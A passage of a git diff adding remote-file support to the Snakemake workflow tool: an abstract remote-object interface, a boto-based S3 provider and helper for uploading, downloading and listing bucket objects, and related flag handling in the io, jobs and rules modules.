if self.is_remote:\n+                if self.remote_object:\n+                    if hasattr( self.remote_object, func.__name__):\n+                        return getattr( self.remote_object, func.__name__)(*args, **kwargs)\n+            return func(self, *args, **kwargs)\n+        return wrapper\n+\n     @property\n+    def is_remote(self):\n+        return is_flagged(self._file, \"remote\")\n+    \n+    @property\n+    def remote_object(self):\n+        if not self._remote_object:\n+            if self.is_remote:\n+               additional_kwargs = get_flag_value(self._file, \"additional_remote_kwargs\") if get_flag_value(self._file, \"additional_remote_kwargs\") else {}\n+               self._remote_object = get_flag_value(self._file, \"remote_provider\").RemoteObject(self, **additional_kwargs)\n+        return self._remote_object\n+    \n+\n+    @property\n+    @_referToRemote\n     def file(self):\n         if not self._is_function:\n             return self._file\n@@ -56,32 +94,74 @@ def file(self):\n                              \"may not be used directly.\")\n \n     @property\n+    @_referToRemote\n     def exists(self):\n         return os.path.exists(self.file)\n \n     @property\n-    def protected(self):\n-        return self.exists and not os.access(self.file, os.W_OK)\n+    def exists_local(self):\n+        return os.path.exists(self.file)\n+\n+    @property\n+    def exists_remote(self):\n+        return (self.is_remote and self.remote_object.exists())\n+    \n \n     @property\n+    def protected(self):\n+        return self.exists_local and not os.access(self.file, os.W_OK)\n+    \n+    @property\n+    @_referToRemote\n     def mtime(self):\n+        return lstat(self.file).st_mtime\n+\n+    @property\n+    def flags(self):\n+        return getattr(self._file, \"flags\", {})\n+\n+    @property\n+    def mtime_local(self):\n         # do not follow symlinks for modification time\n         return lstat(self.file).st_mtime\n \n     @property\n+    @_referToRemote\n     def size(self):\n         # follow symlinks but throw error if invalid\n         self.check_broken_symlink()\n         return os.path.getsize(self.file)\n \n+    @property\n+    def size_local(self):\n+        # follow symlinks but throw error if invalid\n+        self.check_broken_symlink()\n+        return os.path.getsize(self.file)\n+\n     def check_broken_symlink(self):\n         \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n-        if not self.exists and lstat(self.file):\n+        if not self.exists_local and lstat(self.file):\n             raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n \n     def is_newer(self, time):\n         return self.mtime > time\n \n+    def download_from_remote(self):\n+        logger.info(\"Downloading from remote: {}\".format(self.file))\n+\n+        if self.is_remote and self.remote_object.exists():\n+            self.remote_object.download()\n+        else:\n+            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")\n+ \n+    def upload_to_remote(self):\n+        logger.info(\"Uploading to remote: {}\".format(self.file))\n+\n+        if self.is_remote and not self.remote_object.exists():\n+            self.remote_object.upload()\n+        else:\n+            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")\n+\n     def prepare(self):\n         path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n         dir = os.path.dirname(path_until_wildcard)\n@@ -108,9 +188,10 @@ def protect(self):\n     def remove(self):\n         remove(self.file)\n \n-    def touch(self):\n+    def touch(self, times=None):\n+        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"\n         try:\n-            lutime(self.file, None)\n+            lutime(self.file, times)\n         except OSError as e:\n             if e.errno == 2:\n                 raise MissingOutputException(\n@@ -136,11 +217,21 @@ def apply_wildcards(self, wildcards,\n         if self._is_function:\n             f = self._file(Namedlist(fromdict=wildcards))\n \n-        return IOFile(apply_wildcards(f, wildcards,\n+        # this bit ensures flags are transferred over to files after\n+        # wildcards are applied\n+\n+        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})\n+\n+\n+        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,\n                                       fill_missing=fill_missing,\n                                       fail_dynamic=fail_dynamic,\n                                       dynamic_fill=self.dynamic_fill),\n-                      rule=self.rule)\n+                                      rule=self.rule)\n+\n+        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))\n+\n+        return fileWithWildcardsApplied\n \n     def get_wildcard_names(self):\n         return get_wildcard_names(self.file)\n@@ -166,6 +257,17 @@ def match(self, target):\n     def format_dynamic(self):\n         return self.replace(self.dynamic_fill, \"{*}\")\n \n+    def clone_flags(self, other):\n+        if isinstance(self._file, str):\n+            self._file = AnnotatedString(self._file)\n+        if isinstance(other._file, AnnotatedString):\n+            self._file.flags = getattr(other._file, \"flags\", {})\n+\n+    def set_flags(self, flags):\n+        if isinstance(self._file, str):\n+            self._file = AnnotatedString(self._file)\n+        self._file.flags = flags\n+\n     def __eq__(self, other):\n         f = other._file if isinstance(other, _IOFile) else other\n         return self._file == f\n@@ -286,9 +388,17 @@ def flag(value, flag_type, flag_value=True):\n \n def is_flagged(value, flag):\n     if isinstance(value, AnnotatedString):\n-        return flag in value.flags\n+        return flag in value.flags and value.flags[flag]\n+    if isinstance(value, _IOFile):\n+        return flag in value.flags and value.flags[flag]\n     return False\n \n+def get_flag_value(value, flag_type):\n+    if isinstance(value, AnnotatedString):\n+        if flag_type in value.flags:\n+            return value.flags[flag_type]\n+        else:\n+            return None\n \n def temp(value):\n     \"\"\"\n@@ -297,6 +407,9 @@ def temp(value):\n     if is_flagged(value, \"protected\"):\n         raise SyntaxError(\n             \"Protected and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"remote\"):\n+        raise SyntaxError(\n+            \"Remote and temporary flags are mutually exclusive.\")\n     return flag(value, \"temp\")\n \n \n@@ -310,6 +423,9 @@ def protected(value):\n     if is_flagged(value, \"temp\"):\n         raise SyntaxError(\n             \"Protected and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"remote\"):\n+        raise SyntaxError(\n+            \"Remote and protected flags are mutually exclusive.\")\n     return flag(value, \"protected\")\n \n \n@@ -318,7 +434,7 @@ def dynamic(value):\n     A flag for a file that shall be dynamic, i.e. the multiplicity\n     (and wildcard values) will be expanded after a certain\n     rule has been run \"\"\"\n-    annotated = flag(value, \"dynamic\")\n+    annotated = flag(value, \"dynamic\", True)\n     tocheck = [annotated] if not_iterable(annotated) else annotated\n     for file in tocheck:\n         matches = list(_wildcard_regex.finditer(file))\n@@ -334,6 +450,36 @@ def dynamic(value):\n def touch(value):\n     return flag(value, \"touch\")\n \n+def remote(value, provider=S3, keep=False, additional_args=None, additional_kwargs=None):\n+\n+    additional_args = [] if not additional_args else additional_args\n+    additional_kwargs = {} if not additional_kwargs else additional_kwargs\n+\n+    if not provider:\n+        raise RemoteFileException(\"Provider (S3, etc.) must be specified for remote file as kwarg.\")\n+    if is_flagged(value, \"temp\"):\n+        raise SyntaxError(\n+            \"Remote and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"protected\"):\n+        raise SyntaxError(\n+            \"Remote and protected flags are mutually exclusive.\")\n+    return flag(\n+                flag(\n+                    flag( \n+                        flag( \n+                            flag(value, \"remote\"), \n+                            \"remote_provider\", \n+                            provider\n+                        ), \n+                        \"additional_remote_kwargs\", \n+                        additional_kwargs\n+                    ),\n+                    \"additional_remote_args\",\n+                    additional_args\n+                ),\n+                \"keep\",\n+                keep\n+            )\n \n def expand(*args, **wildcards):\n     \"\"\"\n@@ -410,6 +556,31 @@ def glob_wildcards(pattern):\n                     getattr(wildcards, name).append(value)\n     return wildcards\n \n+def glob_wildcards_remote(pattern, provider=S3, additional_kwargs=None):\n+    additional_kwargs = additional_kwargs if additional_kwargs else {}\n+    referenceObj = IOFile(remote(pattern, provider=provider, **additional_kwargs))\n+    key_list = [k.name for k in referenceObj._remote_object.list] \n+\n+    pattern = \"./\"+ referenceObj._remote_object.name\n+    pattern = os.path.normpath(pattern)\n+    first_wildcard = re.search(\"{[^{]\", pattern)\n+    dirname = os.path.dirname(pattern[:first_wildcard.start(\n+    )]) if first_wildcard else os.path.dirname(pattern)\n+    if not dirname:\n+        dirname = \".\"\n+\n+    names = [match.group('name')\n+             for match in _wildcard_regex.finditer(pattern)]\n+    Wildcards = namedtuple(\"Wildcards\", names)\n+    wildcards = Wildcards(*[list() for name in names])\n+\n+    pattern = re.compile(regex(pattern))\n+    for f in key_list:\n+        match = re.match(pattern, f)\n+        if match:\n+            for name, value in match.groupdict().items():\n+                getattr(wildcards, name).append(value)\n+    return wildcards\n \n # TODO rewrite Namedlist!\n class Namedlist(list):\ndiff --git a/snakemake/jobs.py b/snakemake/jobs.py\nindex fdba8b58..317c7c4c 100644\n--- a/snakemake/jobs.py\n+++ b/snakemake/jobs.py\n@@ -13,7 +13,7 @@\n from functools import partial\n from operator import attrgetter\n \n-from snakemake.io import IOFile, Wildcards, Resources, _IOFile\n+from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard\n from snakemake.utils import format, listfiles\n from snakemake.exceptions import RuleException, ProtectedOutputException\n from snakemake.exceptions import UnexpectedOutputException\n@@ -131,7 +131,40 @@ def expanded_output(self):\n                 if not expansion:\n                     yield f_\n                 for f, _ in expansion:\n-                    yield IOFile(f, self.rule)\n+                    fileToYield = IOFile(f, self.rule)\n+\n+                    fileToYield.clone_flags(f_)\n+\n+                    yield fileToYield\n+            else:\n+                yield f\n+\n+    @property\n+    def expanded_input(self):\n+        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"\n+\n+        for f, f_ in zip(self.input, self.rule.input):\n+            if not type(f_).__name__ == \"function\":\n+                if type(f_.file).__name__ not in [\"str\", \"function\"]:\n+                    if contains_wildcard(f_):\n+\n+                        expansion = self.expand_dynamic(\n+                            f_,\n+                            restriction=self.wildcards,\n+                            omit_value=_IOFile.dynamic_fill)\n+                        if not expansion:\n+                            yield f_\n+                        for f, _ in expansion:\n+\n+                            fileToYield = IOFile(f, self.rule)\n+\n+                            fileToYield.clone_flags(f_)\n+\n+                            yield fileToYield\n+                    else:\n+                        yield f\n+                else:\n+                    yield f\n             else:\n                 yield f\n \n@@ -159,6 +192,34 @@ def missing_input(self):\n         return set(f for f in self.input\n                    if not f.exists and not f in self.subworkflow_input)\n \n+\n+    @property\n+    def present_remote_input(self):\n+        files = set()\n+\n+        for f in self.input:\n+            if f.is_remote:\n+                if f.exists_remote:\n+                    files.add(f)\n+        return files\n+    \n+    @property\n+    def present_remote_output(self):\n+        files = set()\n+\n+        for f in self.remote_output:\n+            if f.exists_remote:\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def missing_remote_input(self):\n+        return self.remote_input - self.present_remote_input\n+\n+    @property\n+    def missing_remote_output(self):\n+        return self.remote_output - self.present_remote_output\n+\n     @property\n     def output_mintime(self):\n         \"\"\" Return oldest output file. \"\"\"\n@@ -197,6 +258,74 @@ def missing_output(self, requested=None):\n                     files.add(f)\n         return files\n \n+\n+    @property\n+    def remote_input(self):\n+        for f in self.input:\n+            if f.is_remote:\n+                yield f\n+\n+    @property\n+    def remote_output(self):\n+        for f in self.output:\n+            if f.is_remote:\n+                yield f\n+\n+    @property\n+    def remote_input_newer_than_local(self):\n+        files = set()\n+        for f in self.remote_input:\n+            if (f.exists_remote and f.exists_local) and (f.mtime > f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_input_older_than_local(self):\n+        files = set()\n+        for f in self.remote_input:\n+            if (f.exists_remote and f.exists_local) and (f.mtime < f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_output_newer_than_local(self):\n+        files = set()\n+        for f in self.remote_output:\n+            if (f.exists_remote and f.exists_local) and (f.mtime > f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_output_older_than_local(self):\n+        files = set()\n+        for f in self.remote_output:\n+            if (f.exists_remote and f.exists_local) and (f.mtime < f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    def transfer_updated_files(self):\n+        for f in self.remote_output_older_than_local | self.remote_input_older_than_local:\n+            f.upload_to_remote()\n+\n+        for f in self.remote_output_newer_than_local | self.remote_input_newer_than_local:\n+            f.download_from_remote()\n+    \n+    @property\n+    def files_to_download(self):\n+        toDownload = set()\n+\n+        for f in self.input:\n+            if f.is_remote:\n+                if not f.exists_local and f.exists_remote:\n+                    toDownload.add(f)\n+\n+        toDownload = toDownload | self.remote_input_newer_than_local\n+        return toDownload\n+\n+    @property\n+    def files_to_upload(self):\n+        return self.missing_remote_input & self.remote_input_older_than_local\n+\n     @property\n     def existing_output(self):\n         return filter(lambda f: f.exists, self.expanded_output)\n@@ -231,6 +360,10 @@ def prepare(self):\n                 os.remove(f)\n         for f, f_ in zip(self.output, self.rule.output):\n             f.prepare()\n+\n+        for f in self.files_to_download:\n+            f.download_from_remote()\n+\n         for f in self.log:\n             f.prepare()\n         if self.benchmark:\n@@ -239,6 +372,8 @@ def prepare(self):\n     def cleanup(self):\n         \"\"\" Cleanup output files. \"\"\"\n         to_remove = [f for f in self.expanded_output if f.exists]\n+\n+        to_remove.extend([f for f in self.remote_input if f.exists])\n         if to_remove:\n             logger.info(\"Removing output files of failed job {}\"\n                         \" since they might be corrupted:\\n{}\".format(\n@@ -246,6 +381,23 @@ def cleanup(self):\n             for f in to_remove:\n                 f.remove()\n \n+            self.rmdir_empty_remote_dirs()\n+\n+    @property\n+    def empty_remote_dirs(self):\n+        remote_files = [f for f in (set(self.output) | set(self.input)) if f.is_remote]\n+        emptyDirsToRemove = set(os.path.dirname(f) for f in remote_files if not len(os.listdir(os.path.dirname(f))))\n+        return emptyDirsToRemove\n+\n+    def rmdir_empty_remote_dirs(self):\n+        for d in self.empty_remote_dirs:\n+            pathToDel = d\n+            while len(pathToDel) > 0 and len(os.listdir(pathToDel)) == 0:\n+                logger.info(\"rmdir empty dir: {}\".format(pathToDel))\n+                os.rmdir(pathToDel)\n+                pathToDel = os.path.dirname(pathToDel)\n+\n+\n     def format_wildcards(self, string, **variables):\n         \"\"\" Format a string with variables from the job. \"\"\"\n         _variables = dict()\ndiff --git a/snakemake/remote_providers/RemoteObjectProvider.py b/snakemake/remote_providers/RemoteObjectProvider.py\nnew file mode 100644\nindex 00000000..b040e87d\n--- /dev/null\n+++ b/snakemake/remote_providers/RemoteObjectProvider.py\n@@ -0,0 +1,50 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+from abc import ABCMeta, abstractmethod\n+\n+\n+class RemoteObject:\n+    \"\"\" This is an abstract class to be used to derive remote object classes for \n+        different cloud storage providers. For example, there could be classes for interacting with \n+        Amazon AWS S3 and Google Cloud Storage, both derived from this common base class.\n+    \"\"\"\n+    __metaclass__ = ABCMeta\n+\n+    def __init__(self, ioFile):\n+        self._iofile = ioFile\n+        self._file = ioFile._file\n+\n+    @abstractmethod\n+    def file(self):\n+        pass\n+\n+    @abstractmethod\n+    def exists(self):\n+        pass\n+\n+    @abstractmethod\n+    def mtime(self):\n+        pass\n+\n+    @abstractmethod\n+    def size(self):\n+        pass\n+\n+    @abstractmethod\n+    def download(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def upload(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def list(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def name(self, *args, **kwargs):\n+        pass\ndiff --git a/snakemake/remote_providers/S3.py b/snakemake/remote_providers/S3.py\nnew file mode 100644\nindex 00000000..77b15eac\n--- /dev/null\n+++ b/snakemake/remote_providers/S3.py\n@@ -0,0 +1,90 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+import re\n+\n+from snakemake.remote_providers.RemoteObjectProvider import RemoteObject\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n+from snakemake.remote_providers.implementations.S3 import S3Helper\n+from snakemake.decorators import memoize\n+\n+import boto\n+\n+\n+class RemoteObject(RemoteObject):\n+    \"\"\" This is a class to interact with the AWS S3 object store.\n+    \"\"\"\n+\n+    def __init__(self, *args, **kwargs):\n+        super(RemoteObject, self).__init__(*args, **kwargs)\n+\n+        # pass all args but the first, which is the ioFile\n+        self._s3c = S3Helper(*args[1:], **kwargs)\n+\n+    # === Implementations of abstract class members ===\n+\n+    def file(self):\n+        return self._file\n+\n+    def exists(self):\n+        if self._matched_s3_path:\n+            return self._s3c.exists_in_bucket(self.s3_bucket, self.s3_key)\n+        else:\n+            raise S3FileException(\"The file cannot be parsed as an s3 path in form 'bucket/key': %s\" % self.file())\n+\n+    def mtime(self):\n+        if self.exists():\n+            return self._s3c.key_last_modified(self.s3_bucket, self.s3_key)\n+        else:\n+            raise S3FileException(\"The file does not seem to exist remotely: %s\" % self.file())\n+\n+    def size(self):\n+        if self.exists():\n+            return self._s3c.key_size(self.s3_bucket, self.s3_key)\n+        else:\n+            return self._iofile.size_local\n+\n+    def download(self):\n+        self._s3c.download_from_s3(self.s3_bucket, self.s3_key, self.file())\n+\n+    def upload(self):\n+        conn = boto.connect_s3()\n+        if self.size() > 5000:\n+            self._s3c.upload_to_s3_multipart(self.s3_bucket, self.file(), self.s3_key)\n+        else:\n+            self._s3c.upload_to_s3(self.s3_bucket, self.file(), self.s3_key)\n+\n+    @property\n+    def list(self):\n+        return self._s3c.list_keys(self.s3_bucket)\n+\n+    # === Related methods ===\n+\n+    @property\n+    def _matched_s3_path(self):\n+        return re.search(\"(?P<bucket>[^/]*)/(?P<key>.*)\", self.file())\n+\n+    @property\n+    def s3_bucket(self):\n+        if len(self._matched_s3_path.groups()) == 2:\n+            return self._matched_s3_path.group(\"bucket\")\n+        return None\n+\n+    @property\n+    def name(self):\n+        return self.s3_key\n+\n+    @property\n+    def s3_key(self):\n+        if len(self._matched_s3_path.groups()) == 2:\n+            return self._matched_s3_path.group(\"key\")\n+\n+    def s3_create_stub(self):\n+        if self._matched_s3_path:\n+            if not self.exists:\n+                self._s3c.download_from_s3(self.s3_bucket, self.s3_key, self.file, createStubOnly=True)\n+        else:\n+            raise S3FileException(\"The file to be downloaded cannot be parsed as an s3 path in form 'bucket/key': %s\" %\n+                                  self.file())\ndiff --git a/snakemake/remote_providers/__init__.py b/snakemake/remote_providers/__init__.py\nnew file mode 100644\nindex 00000000..8b137891\n--- /dev/null\n+++ b/snakemake/remote_providers/__init__.py\n@@ -0,0 +1 @@\n+\ndiff --git a/snakemake/remote_providers/implementations/S3.py b/snakemake/remote_providers/implementations/S3.py\nnew file mode 100644\nindex 00000000..c6cb622b\n--- /dev/null\n+++ b/snakemake/remote_providers/implementations/S3.py\n@@ -0,0 +1,341 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+# built-ins\n+import os\n+import math\n+import time\n+import email.utils\n+from time import mktime\n+import datetime\n+from multiprocessing import Pool\n+\n+# third-party modules\n+import boto\n+from boto.s3.key import Key\n+from filechunkio import FileChunkIO\n+\n+\n+class S3Helper(object):\n+\n+    def __init__(self, *args, **kwargs):\n+        # as per boto, expects the environment variables to be set:\n+        # AWS_ACCESS_KEY_ID\n+        # AWS_SECRET_ACCESS_KEY\n+        # Otherwise these values need to be passed in as kwargs\n+        self.conn = boto.connect_s3(*args, **kwargs)\n+\n+    def upload_to_s3(\n+            self,\n+            bucketName,\n+            filePath,\n+            key=None,\n+            useRelativePathForKey=True,\n+            relativeStartDir=None,\n+            replace=False,\n+            reduced_redundancy=False,\n+            headers=None):\n+        \"\"\" Upload a file to S3\n+\n+            This function uploads a file to an AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                filePath: The path to the file to upload.\n+                key: The key to set for the file on S3. If not specified, this will default to the\n+                    name of the file.\n+                useRelativePathForKey: If set to True (default), and key is None, the S3 key will include slashes\n+                    representing the path of the file relative to the CWD. If False only the\n+                    file basename will be used for the key.\n+                relativeStartDir: The start dir to use for useRelativePathForKey. No effect if key is set.\n+                replace: If True a file with the same key will be replaced with the one being written\n+                reduced_redundancy: Sets the file to AWS reduced redundancy storage.\n+                headers: additional heads to pass to AWS\n+\n+            Returns: The key of the file on S3 if written, None otherwise\n+        \"\"\"\n+        filePath = os.path.realpath(os.path.expanduser(filePath))\n+\n+        assert bucketName, \"bucketName must be specified\"\n+        assert os.path.exists(filePath), \"The file path specified does not exist: %s\" % filePath\n+        assert os.path.isfile(filePath), \"The file path specified does not appear to be a file: %s\" % filePath\n+\n+        try:\n+            b = self.conn.get_bucket(bucketName)\n+        except:\n+            b = self.conn.create_bucket(bucketName)\n+\n+        k = Key(b)\n+\n+        if key:\n+            k.key = key\n+        else:\n+            if useRelativePathForKey:\n+                if relativeStartDir:\n+                    pathKey = os.path.relpath(filePath, relativeStartDir)\n+                else:\n+                    pathKey = os.path.relpath(filePath)\n+            else:\n+                pathKey = os.path.basename(filePath)\n+            k.key = pathKey\n+        try:\n+            bytesWritten = k.set_contents_from_filename(\n+                filePath,\n+                replace=replace,\n+                reduced_redundancy=reduced_redundancy,\n+                headers=headers)\n+            if bytesWritten:\n+                return k.key\n+            else:\n+                return None\n+        except:\n+            return None\n+\n+    def download_from_s3(\n+            self,\n+            bucketName,\n+            key,\n+            destinationPath=None,\n+            expandKeyIntoDirs=True,\n+            makeDestDirs=True,\n+            headers=None, createStubOnly=False):\n+        \"\"\" Download a file from s3\n+\n+            This function downloads an object from a specified AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                destinationPath: If specified, the file will be saved to this path, otherwise cwd.\n+                expandKeyIntoDirs: Since S3 keys can include slashes, if this is True (defult)\n+                    then S3 keys with slashes are expanded into directories on the receiving end.\n+                    If it is False, the key is passed to os.path.basename() to get the substring\n+                    following the last slash.\n+                makeDestDirs: If this is True (default) and the destination path includes directories\n+                    that do not exist, they will be created.\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                The destination path of the downloaded file on the receiving end, or None if the filePath\n+                could not be downloaded\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+\n+        if destinationPath:\n+            destinationPath = os.path.realpath(os.path.expanduser(destinationPath))\n+        else:\n+            if expandKeyIntoDirs:\n+                destinationPath = os.path.join(os.getcwd(), key)\n+            else:\n+                destinationPath = os.path.join(os.getcwd(), os.path.basename(key))\n+\n+        # if the destination path does not exist\n+        if not os.path.exists(os.path.dirname(destinationPath)) and makeDestDirs:\n+            os.makedirs(os.path.dirname(destinationPath))\n+\n+        k.key = key if key else os.path.basename(filePath)\n+\n+        try:\n+            if not createStubOnly:\n+                k.get_contents_to_filename(destinationPath, headers=headers)\n+            else:\n+                # just create an empty file with the right timestamps\n+                with open(destinationPath, 'wb') as fp:\n+                    modified_tuple = email.utils.parsedate_tz(k.last_modified)\n+                    modified_stamp = int(email.utils.mktime_tz(modified_tuple))\n+                    os.utime(fp.name, (modified_stamp, modified_stamp))\n+            return destinationPath\n+        except:\n+            return None\n+\n+    def _upload_part(self, bucketName, multipart_id, part_num, source_path, offset, bytesToWrite, numberOfRetries=5):\n+\n+        def _upload(retriesRemaining=numberOfRetries):\n+            try:\n+                b = self.conn.get_bucket(bucketName)\n+                for mp in b.get_all_multipart_uploads():\n+                    if mp.id == multipart_id:\n+                        with FileChunkIO(source_path, 'r', offset=offset, bytes=bytesToWrite) as fp:\n+                            mp.upload_part_from_file(fp=fp, part_num=part_num)\n+                        break\n+            except Exception() as e:\n+                if retriesRemaining:\n+                    _upload(retriesRemaining=retriesRemaining - 1)\n+                else:\n+                    raise e\n+\n+        _upload()\n+\n+    def upload_to_s3_multipart(\n+            self,\n+            bucketName,\n+            filePath,\n+            key=None,\n+            useRelativePathForKey=True,\n+            relativeStartDir=None,\n+            replace=False,\n+            reduced_redundancy=False,\n+            headers=None,\n+            parallel_processes=4):\n+        \"\"\" Upload a file to S3\n+\n+            This function uploads a file to an AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                filePath: The path to the file to upload.\n+                key: The key to set for the file on S3. If not specified, this will default to the\n+                    name of the file.\n+                useRelativePathForKey: If set to True (default), and key is None, the S3 key will include slashes\n+                    representing the path of the file relative to the CWD. If False only the\n+                    file basename will be used for the key.\n+                relativeStartDir: The start dir to use for useRelativePathForKey. No effect if key is set.\n+                replace: If True a file with the same key will be replaced with the one being written\n+                reduced_redundancy: Sets the file to AWS reduced redundancy storage.\n+                headers: additional heads to pass to AWS\n+                parallel_processes: Number of concurrent uploads\n+\n+            Returns: The key of the file on S3 if written, None otherwise\n+        \"\"\"\n+        filePath = os.path.realpath(os.path.expanduser(filePath))\n+\n+        assert bucketName, \"bucketName must be specified\"\n+        assert os.path.exists(filePath), \"The file path specified does not exist: %s\" % filePath\n+        assert os.path.isfile(filePath), \"The file path specified does not appear to be a file: %s\" % filePath\n+\n+        try:\n+            b = self.conn.get_bucket(bucketName)\n+        except:\n+            b = self.conn.create_bucket(bucketName)\n+\n+        pathKey = None\n+        if key:\n+            pathKey = key\n+        else:\n+            if useRelativePathForKey:\n+                if relativeStartDir:\n+                    pathKey = os.path.relpath(filePath, relativeStartDir)\n+                else:\n+                    pathKey = os.path.relpath(filePath)\n+            else:\n+                pathKey = os.path.basename(filePath)\n+\n+        mp = b.initiate_multipart_upload(pathKey, headers=headers)\n+\n+        sourceSize = os.stat(filePath).st_size\n+\n+        bytesPerChunk = 52428800  # 50MB = 50 * 1024 * 1024\n+        chunkCount = int(math.ceil(sourceSize / float(bytesPerChunk)))\n+\n+        pool = Pool(processes=parallel_processes)\n+        for i in range(chunkCount):\n+            offset = i * bytesPerChunk\n+            remainingBytes = sourceSize - offset\n+            bytesToWrite = min([bytesPerChunk, remainingBytes])\n+            partNum = i + 1\n+            pool.apply_async(self._upload_part, [bucketName, mp.id, partNum, filePath, offset, bytesToWrite])\n+        pool.close()\n+        pool.join()\n+\n+        if len(mp.get_all_parts()) == chunkCount:\n+            mp.complete_upload()\n+            try:\n+                key = b.get_key(pathKey)\n+                return key.key\n+            except:\n+                return None\n+        else:\n+            mp.cancel_upload()\n+            return None\n+\n+    def delete_from_bucket(self, bucketName, key, headers=None):\n+        \"\"\" Delete a file from s3\n+\n+            This function deletes an object from a specified AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                The name of the object deleted\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+        k.key = key\n+        ret = k.delete(headers=headers)\n+        return ret.name\n+\n+    def exists_in_bucket(self, bucketName, key, headers=None):\n+        \"\"\" Returns whether the key exists in the bucket\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                True | False\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+        k.key = key\n+        return k.exists(headers=headers)\n+\n+    def key_size(self, bucketName, key, headers=None):\n+        \"\"\" Returns the size of a key based on a HEAD request\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                Size in kb\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = b.lookup(key)\n+\n+        return k.size\n+\n+    def key_last_modified(self, bucketName, key, headers=None):\n+        \"\"\" Returns a timestamp of a key based on a HEAD request\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                timestamp\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = b.lookup(key)\n+\n+        # email.utils parsing of timestamp mirrors boto whereas\n+        # time.strptime() can have TZ issues due to DST\n+        modified_tuple = email.utils.parsedate_tz(k.last_modified)\n+        epochTime = int(email.utils.mktime_tz(modified_tuple))\n+\n+        return epochTime\n+\n+    def list_keys(self, bucketName):\n+        return self.conn.get_bucket(bucketName).list()\ndiff --git a/snakemake/rules.py b/snakemake/rules.py\nindex 36081672..5324eeb8 100644\n--- a/snakemake/rules.py\n+++ b/snakemake/rules.py\n@@ -95,7 +95,12 @@ def get_io(rule):\n             if f in dynamic_io:\n                 try:\n                     for e in reversed(expand(f, zip, **wildcards)):\n-                        expansion[i].append(IOFile(e, rule=branch))\n+                        # need to clone the flags so intermediate\n+                        # dynamic remote file paths are expanded and \n+                        # removed appropriately\n+                        ioFile = IOFile(e, rule=branch)\n+                        ioFile.clone_flags(f)\n+                        expansion[i].append(ioFile)\n                 except KeyError:\n                     return None\n \ndiff --git a/snakemake/workflow.py b/snakemake/workflow.py\nindex b035bc36..833bd907 100644\n--- a/snakemake/workflow.py\n+++ b/snakemake/workflow.py\n@@ -23,7 +23,7 @@\n from snakemake.scheduler import JobScheduler\n from snakemake.parser import parse\n import snakemake.io\n-from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\n+from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch\n from snakemake.persistence import 